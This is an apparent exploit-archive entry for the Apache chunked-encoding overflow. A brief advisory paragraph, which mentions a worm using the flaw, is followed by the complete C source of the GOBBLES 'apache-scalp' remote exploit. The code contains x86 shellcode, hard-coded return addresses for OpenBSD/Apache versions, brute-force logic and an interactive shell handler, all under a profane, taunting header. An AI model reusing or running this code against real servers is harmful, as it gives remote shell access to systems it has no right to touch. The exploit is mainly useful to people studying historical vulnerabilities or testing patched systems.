source: http://www.securityfocus.com/bid/5033/info

When processing requests coded with the 'Chunked Encoding' mechanism, Apache fails to properly calculate required buffer sizes. This is believed to be due to improper (signed) interpretation of an unsigned integer value. Consequently, several conditions that have security implications may occur. Reportedly, a buffer overrun and signal race condition occur. Exploiting these conditions may allow arbitrary code to run.

**Update**: Reportedly, at least one worm is exploiting this vulnerability to propagate in the wild. The worm targets FreeBSD 4.5 systems running Apache 1.3.22-24 and 1.3.20. Other versions may also be affected.


/*
 * apache-scalp.c
 * OPENBSD/X86 APACHE REMOTE EXPLOIT!!!!!!! 
 * 
 * ROBUST, RELIABLE, USER-FRIENDLY MOTHERFUCKING 0DAY WAREZ!
 *
 * BLING! BLING! --- BRUTE FORCE CAPABILITIES --- BLING! BLING!
 * 
 * ". . . and Doug Sniff said it was a hole in Epic."
 *
 * ---
 * Disarm you with a smile
 * And leave you like they left me here
 * To wither in denial
 * The bitterness of one who's left alone
 * ---
 *
 * Remote OpenBSD/Apache exploit for the "chunking" vulnerability. Kudos to
 * the OpenBSD developers (Theo, DugSong, jnathan, *@#!w00w00, ...) and
 * their crappy memcpy implementation that makes this 32-bit impossibility
 * very easy to accomplish. This vulnerability was recently rediscovered by a slew
 * of researchers.
 *
 * The "experts" have already concurred that this bug...
 *      -       Can not be exploited on 32-bit *nix variants
 *      -       Is only exploitable on win32 platforms
 *      -       Is only exploitable on certain 64-bit systems
 *
 * However, contrary to what ISS would have you believe, we have
 * successfully exploited this hole on the following operating systems:
 *
 *      Sun Solaris 6-8 (sparc/x86)
 *      FreeBSD 4.3-4.5 (x86)
 *      OpenBSD 2.6-3.1 (x86)
 *      Linux (GNU) 2.4 (x86)
 *
 * Don't get discouraged too quickly in your own research. It took us close
 * to two months to be able to exploit each of the above operating systems.
 * There is a peculiarity to be found for each operating system that makes the
 * exploitation possible.
 *
 * Don't email us asking for technical help or begging for warez. We are
 * busy working on many other wonderful things, including other remotely
 * exploitable holes in Apache. Perhaps The Great Pr0ix would like to inform
 * the community that those holes don't exist? We wonder who's paying her.
 *
 * This code is an early version from when we first began researching the
 * vulnerability. It should spawn a shell on any unpatched OpenBSD system
 * running the Apache webserver.
 *
 * We appreciate The Blue Boar's effort to allow us to post to his mailing
 * list once again. Because he finally allowed us to post, we now have this
 * very humble offering.
 *
 * This is a very serious vulnerability. After disclosing this exploit, we
 * hope to have gained immense fame and glory.
 *
 * Testbeds: synnergy.net, monkey.org, 9mm.com
 *
 * Abusing the right syscalls, any exploit against OpenBSD == root. Kernel
 * bugs are great. 
 *
 * [#!GOBBLES QUOTES]
 * 
 * --- you just know 28923034839303 admins out there running
 *     OpenBSD/Apache are going "ugh..not exploitable..ill do it after the
 *     weekend"
 * --- "Five years without a remote hole in the default install". default
 *      package = kernel. if theo knew that talkd was exploitable, he'd cry.
 * --- so funny how apache.org claims it's impossible to exploit this.
 * --- how many times were we told, "ANTISEC IS NOT FOR YOU" ?       
 * --- I hope Theo doesn't kill himself                        
 * --- heh, this is a middle finger to all those open source, anti-"m$"
 *     idiots... slashdot hippies...
 * --- they rushed to release this exploit so they could update their ISS
 *     scanner to have a module for this vulnerability, but it doesnt even
 *     work... it's just looking for win32 apache versions
 * --- no one took us seriously when we mentioned this last year. we warned
 *     them that moderation == no pie.
 * --- now try it against synnergy :>                           
 * --- ANOTHER BUG BITE THE DUST... VROOOOM VRRRRRRROOOOOOOOOM
 *
 * xxxx  this thing is a major exploit. do you really wanna publish it?
 * oooo  i'm not afraid of whitehats
 * xxxx  the blackhats will kill you for posting that exploit
 * oooo  blackhats are a myth
 * oooo  so i'm not worried
 * oooo  i've never seen one
 * oooo  i guess it's sort of like having god in your life
 * oooo  i don't believe there's a god
 * oooo  but if i sat down and met him
 * oooo  i wouldn't walk away thinking
 * oooo  "that was one hell of a special effect"
 * oooo  so i suppose there very well could be a blackhat somewhere
 * oooo  but i doubt it... i've seen whitehat-blackhats with their ethics
 *       and deep philosophy...
 *
 * [GOBBLES POSERS/WANNABES]
 *
 * --- #!GOBBLES@EFNET (none of us join here, but we've sniffed it)
 * --- super@GOBBLES.NET (low-level.net)
 *
 * GOBBLES Security
 * GOBBLES@hushmail.com
 * http://www.bugtraq.org
 *
 */


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/time.h>
#include <signal.h>


#define EXPLOIT_TIMEOUT		5	/* num seconds to wait before assuming it failed */
#define RET_ADDR_INC		512


#define MEMCPY_s1_OWADDR_DELTA	-146
#define PADSIZE_1		4
#define PADSIZE_2 		5
#define PADSIZE_3		7


#define REP_POPULATOR		24
#define REP_RET_ADDR		6
#define REP_ZERO		36
#define REP_SHELLCODE		24
#define NOPCOUNT		1024

#define NOP			0x41
#define PADDING_1		'A'
#define PADDING_2		'B'
#define PADDING_3		'C'

#define PUT_STRING(s)		memcpy(p, s, strlen(s)); p += strlen(s);
#define PUT_BYTES(n, b)		memset(p, b, n); p += n;

#define SHELLCODE_LOCALPORT_OFF 30

char shellcode[] =
  "\x89\xe2\x83\xec\x10\x6a\x10\x54\x52\x6a\x00\x6a\x00\xb8\x1f"
  "\x00\x00\x00\xcd\x80\x80\x7a\x01\x02\x75\x0b\x66\x81\x7a\x02"
  "\x42\x41\x75\x03\xeb\x0f\x90\xff\x44\x24\x04\x81\x7c\x24\x04"
  "\x00\x01\x00\x00\x75\xda\xc7\x44\x24\x08\x00\x00\x00\x00\xb8"
  "\x5a\x00\x00\x00\xcd\x80\xff\x44\x24\x08\x83\x7c\x24\x08\x03"
  "\x75\xee\x68\x0b\x6f\x6b\x0b\x81\x34\x24\x01\x00\x00\x01\x89"
  "\xe2\x6a\x04\x52\x6a\x01\x6a\x00\xb8\x04\x00\x00\x00\xcd\x80"
  "\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe2\x31\xc0\x50"
  "\x52\x89\xe1\x50\x51\x52\x50\xb8\x3b\x00\x00\x00\xcd\x80\xcc";


struct {
	char *type;
	u_long retaddr;
} targets[] = {	// hehe, yes theo, that say OpenBSD here!
	{ "OpenBSD 3.0 x86 / Apache 1.3.20",	0xcf92f },
	{ "OpenBSD 3.0 x86 / Apache 1.3.22",	0x8f0aa },
	{ "OpenBSD 3.0 x86 / Apache 1.3.24",	0x90600 },
	{ "OpenBSD 3.1 x86 / Apache 1.3.20",	0x8f2a6 },
	{ "OpenBSD 3.1 x86 / Apache 1.3.23",	0x90600 },
	{ "OpenBSD 3.1 x86 / Apache 1.3.24",	0x9011a },
	{ "OpenBSD 3.1 x86 / Apache 1.3.24 #2",	0x932ae },
};


int main(int argc, char *argv[]) {

	char           *hostp, *portp;
	unsigned char   buf[512], *expbuf, *p;
	int             i, j, lport;
	int             sock;
	int             bruteforce, owned, progress;
	u_long          retaddr;
	struct sockaddr_in sin, from;


	if(argc != 3) {
		printf("Usage: %s <target#|base address> <ip[:port]>\n", argv[0]);
		printf("  Using targets:\t./apache-scalp 3 127.0.0.1:8080\n");
		printf("  Using bruteforce:\t./apache-scalp 0x8f000 127.0.0.1:8080\n");
		printf("\n--- --- - Potential targets list - --- ----\n");
		printf("Target ID / Target specification\n");
		for(i = 0; i < sizeof(targets)/8; i++)
			printf("\t%d / %s\n", i, targets[i].type);

		return -1;
	}


	hostp = strtok(argv[2], ":");
	if((portp = strtok(NULL, ":")) == NULL)
		portp = "80";

	retaddr = strtoul(argv[1], NULL, 16);
	if(retaddr < sizeof(targets)/8) {
		retaddr = targets[retaddr].retaddr;
		bruteforce = 0;
	}
	else
		bruteforce = 1;
		

	srand(getpid());
	signal(SIGPIPE, SIG_IGN);
	for(owned = 0, progress = 0;;retaddr += RET_ADDR_INC) {

		/* skip invalid return adresses */
		i = retaddr & 0xff;
		if(i == 0x0a || i == 0x0d)
			retaddr++;
		else if(memchr(&retaddr, 0x0a, 4) || memchr(&retaddr, 0x0d, 4))
			continue;


		sock = socket(AF_INET, SOCK_STREAM, 0);
		sin.sin_family = AF_INET;
		sin.sin_addr.s_addr = inet_addr(hostp);
		sin.sin_port = htons(atoi(portp));
		if(!progress)
			printf("\n[*] Connecting.. ");

		fflush(stdout);
		if(connect(sock, (struct sockaddr *) & sin, sizeof(sin)) != 0) {
			perror("connect()");
			exit(1);
		}

		if(!progress)
			printf("connected!\n");


		/* Setup the local port in our shellcode */
		i = sizeof(from);
		if(getsockname(sock, (struct sockaddr *) & from, &i) != 0) {
			perror("getsockname()");
			exit(1);
		}

		lport = ntohs(from.sin_port);
		shellcode[SHELLCODE_LOCALPORT_OFF + 1] = lport & 0xff;
		shellcode[SHELLCODE_LOCALPORT_OFF + 0] = (lport >> 8) & 0xff;


		p = expbuf = malloc(8192 + ((PADSIZE_3 + NOPCOUNT + 1024) * REP_SHELLCODE)
				    + ((PADSIZE_1 + (REP_RET_ADDR * 4) + REP_ZERO + 1024) * REP_POPULATOR));

		PUT_STRING("GET / HTTP/1.1\r\nHost: apache-scalp.c\r\n");

		for (i = 0; i < REP_SHELLCODE; i++) {
			PUT_STRING("X-");
			PUT_BYTES(PADSIZE_3, PADDING_3);
			PUT_STRING(": ");
			PUT_BYTES(NOPCOUNT, NOP);
			memcpy(p, shellcode, sizeof(shellcode) - 1);
			p += sizeof(shellcode) - 1;
			PUT_STRING("\r\n");
		}

		for (i = 0; i < REP_POPULATOR; i++) {
			PUT_STRING("X-");
			PUT_BYTES(PADSIZE_1, PADDING_1);
			PUT_STRING(": ");
			for (j = 0; j < REP_RET_ADDR; j++) {
				*p++ = retaddr & 0xff;
				*p++ = (retaddr >> 8) & 0xff;
				*p++ = (retaddr >> 16) & 0xff;
				*p++ = (retaddr >> 24) & 0xff;
			}

			PUT_BYTES(REP_ZERO, 0);
			PUT_STRING("\r\n");
		}

		PUT_STRING("Transfer-Encoding: chunked\r\n");
		snprintf(buf, sizeof(buf) - 1, "\r\n%x\r\n", PADSIZE_2);
		PUT_STRING(buf);
		PUT_BYTES(PADSIZE_2, PADDING_2);
		snprintf(buf, sizeof(buf) - 1, "\r\n%x\r\n", MEMCPY_s1_OWADDR_DELTA);
		PUT_STRING(buf);

		write(sock, expbuf, p - expbuf);

		progress++;
		if((progress%70) == 0)
			progress = 1;

		if(progress == 1) {
			memset(buf, 0, sizeof(buf));
			sprintf(buf, "\r[*] Currently using retaddr 0x%lx, length %u, localport %u",
				retaddr, (unsigned int)(p - expbuf), lport);
			memset(buf + strlen(buf), ' ', 74 - strlen(buf));
			puts(buf);
			if(bruteforce)
				putchar(';');
		}
		else
			putchar((rand()%2)? 'P': 'p');


		fflush(stdout);
		while (1) {
			fd_set          fds;
			int             n;
			struct timeval  tv;

			tv.tv_sec = EXPLOIT_TIMEOUT;
			tv.tv_usec = 0;

			FD_ZERO(&fds);
			FD_SET(0, &fds);
			FD_SET(sock, &fds);

			memset(buf, 0, sizeof(buf));
			if(select(sock + 1, &fds, NULL, NULL, &tv) > 0) {
				if(FD_ISSET(sock, &fds)) {
					if((n = read(sock, buf, sizeof(buf) - 1)) <= 0)
						break;

					if(!owned && n >= 4 && memcmp(buf, "\nok\n", 4) == 0) {
						printf("\nGOBBLE GOBBLE!@#%%)*#\n");
						printf("retaddr 0x%lx did the trick!\n", retaddr);
						sprintf(expbuf, "uname -a;id;echo hehe, now use 0day OpenBSD local kernel exploit to gain instant r00t\n");
						write(sock, expbuf, strlen(expbuf));
						owned++;
					}

					write(1, buf, n);
				}

				if(FD_ISSET(0, &fds)) {
					if((n = read(0, buf, sizeof(buf) - 1)) < 0)
						exit(1);

					write(sock, buf, n);
				}
			}

			if(!owned)
				break;
		}

		free(expbuf);
		close(sock);

		if(owned)
			return 0;

		if(!bruteforce) {
			fprintf(stderr, "Ooops.. hehehe!\n");
			return -1;
		}
	}

	return 0;
}
